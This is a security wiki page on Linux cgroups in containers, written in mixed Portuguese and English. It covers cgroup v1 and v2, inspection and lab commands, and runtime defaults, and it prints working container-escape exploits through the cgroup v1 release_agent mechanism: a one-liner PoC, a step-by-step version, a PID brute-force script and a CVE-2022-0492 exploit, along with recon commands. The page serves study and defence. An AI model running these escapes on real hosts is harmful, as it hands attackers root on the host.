# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

Linux **control groups** são o mecanismo do kernel usado para agrupar processos juntos para contabilização, limitação, priorização e aplicação de políticas. Se namespaces tratam principalmente de isolar a visão dos recursos, cgroups tratam principalmente de governar **quanto** desses recursos um conjunto de processos pode consumir e, em alguns casos, **quais classes de recursos** eles podem interagir. Containers dependem de cgroups constantemente, mesmo quando o usuário nunca os vê diretamente, porque quase todo runtime moderno precisa de uma forma de dizer ao kernel "esses processos pertencem a essa workload, e estas são as regras de recursos que se aplicam a eles".

É por isso que container engines colocam um novo container em sua própria subárvore de cgroup. Uma vez que a árvore de processos esteja lá, o runtime pode limitar memória, limitar o número de PIDs, ponderar o uso de CPU, regular I/O e restringir o acesso a dispositivos. Em um ambiente de produção, isso é essencial tanto para segurança multi-tenant quanto para higiene operacional básica. Um container sem controles de recursos significativos pode esgotar memória, inundar o sistema com processos ou monopolizar CPU e I/O de formas que tornem o host ou cargas de trabalho vizinhas instáveis.

Do ponto de vista de segurança, cgroups importam de duas maneiras distintas. Primeiro, limites de recursos ruins ou ausentes permitem ataques de denial-of-service simples. Segundo, alguns recursos de cgroup, especialmente em setups mais antigos de **cgroup v1**, historicamente criaram primitivos de breakout poderosos quando eram graváveis de dentro de um container.

## v1 Vs v2

Existem dois modelos principais de cgroup em uso. **cgroup v1** expõe múltiplas hierarquias de controllers, e exploit writeups mais antigos frequentemente giram em torno das semânticas estranhas e por vezes excessivamente poderosas disponíveis lá. **cgroup v2** introduz uma hierarquia mais unificada e um comportamento geralmente mais limpo. Distribuições modernas cada vez mais preferem cgroup v2, mas ambientes mistos ou legados ainda existem, o que significa que ambos os modelos ainda são relevantes ao revisar sistemas reais.

A diferença importa porque algumas das histórias de container breakout mais famosas, como abusos de **`release_agent`** em cgroup v1, estão ligadas muito especificamente ao comportamento antigo de cgroup. Um leitor que vê um cgroup exploit em um blog e então o aplica cegamente a um sistema moderno somente cgroup v2 provavelmente irá entender mal o que é realmente possível no alvo.

## Inspeção

A maneira mais rápida de ver onde seu shell atual está:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
O arquivo `/proc/self/cgroup` mostra os caminhos de cgroup associados ao processo atual. Em um host moderno com cgroup v2, você frequentemente verá uma entrada unificada. Em hosts mais antigos ou híbridos, você pode ver vários caminhos de controladores v1. Uma vez que você saiba o caminho, pode inspecionar os arquivos correspondentes em `/sys/fs/cgroup` para ver limites e uso atual.

Em um host com cgroup v2, os comandos a seguir são úteis:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Esses arquivos revelam quais controladores existem e quais são delegados para child cgroups. Esse modelo de delegação importa em ambientes rootless e systemd-managed, onde o runtime pode apenas controlar o subconjunto da funcionalidade de cgroup que a hierarquia pai realmente delega.

## Lab

Uma forma de observar cgroups na prática é executar um container com limite de memória:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Você também pode tentar um container com PID limitado:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Uso do runtime

Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. The differences are usually not about whether they use cgroups, but about **which defaults they choose**, **how they interact with systemd**, **how rootless delegation works**, and **how much of the configuration is controlled at the engine level versus the orchestration level**.

In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.

## Misconfigurações e fugas

The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.

Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.

### `release_agent` - Contexto

The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.

For the technique to work, the attacker generally needs:

- a writable **cgroup v1** hierarchy
- the ability to create or use a child cgroup
- the ability to set `notify_on_release`
- the ability to write a path into `release_agent`
- a path that resolves to an executable from the host point of view

### PoC clássico

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Esta PoC escreve um caminho de payload em `release_agent`, aciona o cgroup release e então lê o arquivo de saída gerado no host.

### Passo a passo legível

A mesma ideia é mais fácil de entender quando dividida em etapas.

1. Crie e prepare um cgroup gravável:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifique o host path que corresponde ao container filesystem:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Coloque um payload que será visível no caminho do host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Acionar a execução esvaziando o cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
O efeito é a execução no host do payload com privilégios de root do host. Em um exploit real, o payload geralmente escreve um arquivo de prova, inicia um reverse shell ou modifica o estado do host.

### Variante de caminho relativo usando `/proc/<pid>/root`

Em alguns ambientes, o caminho do host para o sistema de arquivos do container não é óbvio ou está escondido pelo driver de armazenamento. Nesse caso o caminho do payload pode ser expresso através de `/proc/<pid>/root/...`, onde `<pid>` é um host PID pertencente a um processo no container atual. Essa é a base da variante de força bruta por caminho relativo:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
O truque relevante aqui não é o brute force em si, mas a forma do caminho: `/proc/<pid>/root/...` permite que o kernel resolva um arquivo dentro do sistema de arquivos do container a partir do namespace do host, mesmo quando o caminho direto de armazenamento do host não é conhecido antecipadamente.

### Variante do CVE-2022-0492

Em 2022, o CVE-2022-0492 mostrou que escrever em `release_agent` no cgroup v1 não estava verificando corretamente `CAP_SYS_ADMIN` no namespace de usuário **inicial**. Isso tornou a técnica muito mais alcançável em kernels vulneráveis porque um processo no container que podia montar uma hierarquia de cgroup podia escrever em `release_agent` sem já ter privilégios no namespace de usuário do host.

Exploit mínimo:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Em um kernel vulnerável, o host executa `/proc/self/exe` com privilégios de root do host.

Para abuso prático, comece verificando se o ambiente ainda expõe caminhos cgroup-v1 com permissão de escrita ou acesso perigoso a dispositivos:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Se o `release_agent` estiver presente e gravável, você já está em território legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Se o próprio caminho do cgroup não resultar em um escape, o próximo uso prático costuma ser denial of service ou reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
These commands quickly tell you whether the workload has room to fork-bomb, consume memory aggressively, or abuse a writable legacy cgroup interface.

## Verificações

Ao revisar um alvo, o objetivo das verificações de cgroup é descobrir qual modelo de cgroup está em uso, se o container vê caminhos de controller graváveis, e se primitivas antigas de breakout, como `release_agent`, são sequer relevantes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
O que é interessante aqui:

- Se `mount | grep cgroup` mostrar **cgroup v1**, writeups antigos sobre breakout tornam-se mais relevantes.
- Se `release_agent` existir e for alcançável, isso merece uma investigação mais aprofundada imediatamente.
- Se a hierarquia cgroup visível for gravável e o container também tiver capabilities fortes, o ambiente merece uma revisão muito mais cuidadosa.

Se você descobrir **cgroup v1**, montagens de controladores graváveis e um container que também tenha capabilities fortes ou proteção fraca do seccomp/AppArmor, essa combinação merece atenção cuidadosa. cgroups costumam ser tratados como um tópico entediante de gerenciamento de recursos, mas historicamente fizeram parte de algumas das cadeias de escape de container mais instrutivas precisamente porque a fronteira entre "controle de recursos" e "influência no host" nem sempre foi tão limpa quanto as pessoas supunham.

## Runtime Defaults

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Containers are placed in cgroups automatically; resource limits are optional unless set with flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | omitting resource requests/limits, privileged device access, host-level runtime misconfiguration |
| containerd / CRI-O | Enabled by default | cgroups are part of normal lifecycle management | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |

A distinção importante é que **a existência de cgroup** geralmente está ativada por padrão, enquanto **restrições úteis de recursos** costumam ser opcionais, a menos que explicitamente configuradas.
